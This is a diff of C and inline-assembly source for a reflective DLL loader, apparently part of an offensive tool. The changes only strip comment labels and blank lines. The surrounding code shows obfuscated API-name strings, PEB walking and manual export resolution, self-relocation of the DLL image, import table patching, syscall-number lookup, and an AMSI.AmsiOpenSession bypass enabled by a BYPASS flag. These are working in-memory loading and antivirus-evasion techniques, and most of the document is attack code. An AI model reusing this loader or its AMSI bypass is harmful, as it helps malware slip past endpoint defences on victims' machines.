@@ -45,20 +45,16 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	tNtFlushInstructionCache pNtFlushInstructionCache = NULL;
 	// KERNEL32 Variables
 	PVOID kernel32Addr, kernel32ExportDirectory, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable;
-	
 	char getProcAddrStr[] = "f#A@4!g.22y:23";
 	PVOID getProcAddrStrLen = (PVOID)14;
 	tGetProcAddress pGetProcAddress = NULL;
-
 	char loadLibraryAStr[] = "3.1#$i-r3r,A";
 	PVOID loadLibraryAStrLen = (PVOID)12;
 	tLoadLibraryA pLoadLibraryA = NULL;
-	
 	char VirtualAllocStr[] = "3t,2ua46.5oc";
 	PVOID VirtualAllocStrLen = (PVOID)12;
 	tVirtualAlloc pVirtualAlloc = NULL;
-
-	// STEP X: Resolve the addresses of NTDLL and Kernel32 from the Loader via GS>TEB>PEB>LDR>InMemoryOrderModuleList
+	// Resolve the addresses of NTDLL and Kernel32 from the Loader via GS>TEB>PEB>LDR>InMemoryOrderModuleList
 	//   - This is done by matching the first 4 unicode charaters of the DLL BaseName
 	char ntdlStr[] = "ntdl"; // L"ntdll.dll" - Only need the first 4 unicode bytes to find the DLL from the loader list
 	ntdllAddr = (PVOID)crawlLdrDllList((PVOID)ntdlStr);
@@ -66,7 +62,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	ntdllExAddrTable = getExportAddressTable(ntdllAddr, ntdllExportDirectory);
 	ntdllExNamePointerTable = getExportNameTable(ntdllAddr, ntdllExportDirectory);
 	ntdllExOrdinalTable = getExportOrdinalTable(ntdllAddr, ntdllExportDirectory);
-
 	// NTDLL.NtFlushInstructionCache
 	//char ntFlushStr[] = "NtFlushInstructionCache";
 	// String length : 23
@@ -105,14 +100,12 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 			}
 		}
 	}
-
 	char kernstr[] = "KERN"; // L"KERNEL32.DLL" - Debugging shows that kernel32 loads in with all uppercase. May need to check for both in future 
 	kernel32Addr = (PVOID)crawlLdrDllList((PVOID)kernstr);
 	kernel32ExportDirectory = getExportDirectory(kernel32Addr);
 	kernel32ExAddrTable = getExportAddressTable(kernel32Addr, kernel32ExportDirectory);
 	kernel32ExNamePointerTable = getExportNameTable(kernel32Addr, kernel32ExportDirectory);
 	kernel32ExOrdinalTable = getExportOrdinalTable(kernel32Addr, kernel32ExportDirectory);
-
 	// String length : 14
 	__asm__(
 		"mov rsi, %[getProcAddrStr] \n"
@@ -154,7 +147,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		:[loadLibraryAStr] "r" (loadLibraryAStr)
 	);
 	pLoadLibraryA  = getSymbolAddress(loadLibraryAStr, loadLibraryAStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
-	
 	#ifdef BYPASS
 	// AMSI.AmsiOpenSession Bypass
 	char amsiStr[] = "f!@.24#.62#6.2#"; // have space in reserved bytes for null string terminator
@@ -249,7 +241,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	#endif
 	// Find ourselves in memory by searching for "MZ" 
 	initRdllAddr = findSelf();
-	// STEP 2 | Get size of our RDLL image, allocate memory for our new RDLL, and copy/write the headers from init RDLL to new RDLL
+	// Get size of our RDLL image, allocate memory for our new RDLL, and copy/write the headers from init RDLL to new RDLL
 	// get the VA of the NT Header for the PE to be loaded
 	newExeHeaderAddr = getNewExeHeader(initRdllAddr);
 	// Get the size of our entire RDLL
@@ -275,7 +267,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	);
 	// Write Headers from init RDLL to new RDLL
 	copyMemory(SizeOfHeaders, initRdllAddr, newRdllAddr);
-	// STEP 3 | Copy/write the sections from init RDLL to new RDLL
+	// Copy/write the sections from init RDLL to new RDLL
 	// RdllNthSectionAddr = the VA of the first section
 	// RdllNthSectionAddr = ( (PVOID)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
 	// Get the Optional Header Address
@@ -320,7 +312,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	PVOID SectionRelativeVirtualAddress, newRdllSectionVirtualAddress, RVASectionPointerToRawData, InitRdllSectionVirtualAddress, SizeOfSection;
 	while( NumberOfSections-- )
 	{
-		// STEP 3.1 | Get the source destination for the section
+		// Get the source destination for the section
 		// ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->VirtualAddress = DWORD [RdllNthSectionAddr+0xC]
 		// .text = SectionRelativeVirtualAddress = 191000 | 190000 = &newRdllAddr | 1000 = VirtualAddress
 		//SectionRelativeVirtualAddress = ( newRdllAddr + ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->VirtualAddress );
@@ -344,8 +336,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 			:[newRdllAddr] "r" (newRdllAddr),
 			[SectionRelativeVirtualAddress] "r" (SectionRelativeVirtualAddress)
 		);	
-
-		// STEP 3.2 | Get the destination memory address to write the section too
+		//  Get the destination memory address to write the section too
 		// ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->PointerToRawData = DWORD [RdllNthSectionAddr+0x14]
 		// .text = InitRdllSectionVirtualAddress = 140400 | 140000 = &newRdllAddr | 400 = PointerToRawData
 		// InitRdllSectionVirtualAddress = ( initRdllAddr + ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->PointerToRawData );
@@ -369,7 +360,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 			:[initRdllAddr] "r" (initRdllAddr),
 			[RVASectionPointerToRawData] "r" (RVASectionPointerToRawData)
 		);	
-		// STEP 3.3 | Get the size of the section
+		// Get the size of the section
 		// ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->SizeOfRawData = DWORD [RdllNthSectionAddr+0x10]
 		// SizeOfSection = ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->SizeOfRawData
 		__asm__(
@@ -381,13 +372,13 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 			:[SizeOfSection] "=r" (SizeOfSection)
 			:[RdllNthSectionAddr] "r" (RdllNthSectionAddr)
 		);
-		// STEP 3.4 | Copy the section from the source address to the destination for the size of the section
+		// Copy the section from the source address to the destination for the size of the section
 		//while( SizeOfSection-- )
 		//	*(BYTE *)newRdllSectionVirtualAddress++ = *(BYTE *)InitRdllSectionVirtualAddress++;
 		// Write/Copy the section to the newRdll Adress memory
 		copyMemory(SizeOfSection,InitRdllSectionVirtualAddress,newRdllSectionVirtualAddress);
 
-		// STEP 3.5 | Get the address of the next section header and loop until there are no more sections
+		// Get the address of the next section header and loop until there are no more sections
 		//RdllNthSectionAddr += sizeof( IMAGE_SECTION_HEADER );
 		__asm__(
 			"mov rax, %[InRdllNthSectionAddr] \n"
@@ -397,10 +388,8 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 			:[InRdllNthSectionAddr] "r" (RdllNthSectionAddr)
 		);
 	}
-
-	// STEP 4: process our images import table
-
-	// STEP 4.1 | Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
+	// Process Images Import Table
+	// Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
 	// rdllDataDirImportDirectoryAddr = (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
 	PVOID rdllDataDirImportDirectoryAddr;
 	__asm__(
@@ -412,7 +401,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		:[rdllDataDirImportDirectoryAddr] "=r" (rdllDataDirImportDirectoryAddr)
 		:[OptionalHeaderAddr] "r" (OptionalHeaderAddr)
 	);
-	// STEP 4.2 | Get the Address of the Import Directory from the Data Directory
+	// Get the Address of the Import Directory from the Data Directory
 	//     typedef struct _IMAGE_DATA_DIRECTORY {
 	//       DWORD VirtualAddress;
 	//       DWORD Size;
@@ -430,7 +419,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		:[rdllDataDirImportDirectoryAddr] "r" (rdllDataDirImportDirectoryAddr),
 		 [newRdllAddr] "r" (newRdllAddr)
 	);
-
 	PVOID nextModuleImportDescriptor = rdllImportDirectoryAddr;
 	PVOID ImportedDllAddr, importedDllExportAddressTable, importedDllExportNameTable, importedDllExportOrdinalTable, 
 	      importEntryHint, importedDllBaseOrdinal, importEntryExportTableIndex, importEntryAddressRVA, importEntryAddress, importNameRVA, importName;
@@ -514,7 +502,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 
 			if( importLookupTableEntry && ((PIMAGE_THUNK_DATA)importLookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
 			{
-				// STEP 3 | Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
+				// Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
 				//   This is located in the Export Directory in memory of the module which functions/api's are being imported
 				// importedDllBaseOrdinal = ((PIMAGE_EXPORT_DIRECTORY )importedDllExportDirectory)->Base;
 				__asm__(
@@ -526,7 +514,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 					:[importedDllBaseOrdinal] "=r" (importedDllBaseOrdinal)
 					:[importedDllExportDirectory] "r" (importedDllExportDirectory)
 				);
-				// STEP 4 | Import Hint from the modules Hint/Name table
+				// Import Hint from the modules Hint/Name table
 				__asm__(
 					"mov rax, %[importLookupTableEntry] \n"
 					"mov rax, [rax] \n" // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
@@ -535,7 +523,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 					:[importEntryHint] "=r" (importEntryHint)
 					:[importLookupTableEntry] "r" (importLookupTableEntry)
 				);
-				// STEP 5 | Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
+				// Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
 				// Import Hint from Hint/Name Table (first 2 bytes before the name string)
 				// ImportHint - ExportBaseOrdinal = The location of the API/function in the ExportAddressTable entries
 				// importEntryExportTableIndex = importEntryHint - importedDllBaseOrdinal;
@@ -548,7 +536,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 					:[importEntryHint] "r" (importEntryHint),
 					 [importedDllBaseOrdinal] "r" (importedDllBaseOrdinal)
 				);
-				// STEP 6 | Get the RVA for our Import Entry executable function address
+				// Get the RVA for our Import Entry executable function address
 				// The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
 				// importEntryAddressRVA = importEntryExportTableIndex * sizeof(DWORD) + importedDllExportAddressTable;
 				__asm__(
@@ -564,7 +552,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 					[importedDllExportAddressTable]"r"(importedDllExportAddressTable)
 					
 				);
-				// STEP 7 | Get the real address for our imported function and write it to our import table
+				// Get the real address for our imported function and write it to our import table
 				// patch in the address for this imported function
 				__asm__(
 					"mov rax, %[importAddressTableEntry] \n"
@@ -582,7 +570,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 			}
 			else
 			{
-				// STEP 8 | If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
+				// If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
 				// get the VA of this functions import by name struct
 				__asm__(
 					"mov rax, %[importAddressTableEntry] \n"
@@ -979,7 +967,6 @@ __asm__(
 	"add rax, rcx \n"
 	"ret \n" //return ImportDirectory 
 );
-
 // PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable)
 __asm__(
 "getSymbolAddress: \n"
@@ -1037,7 +1024,6 @@ __asm__(
 	"jne writeLooper2 \n"   // if rax != 0, then write next byte via loop
 	"ret \n"
 );
-
 __asm__(
 "findSyscallNumber: \n"
 	"xor rsi, rsi \n"
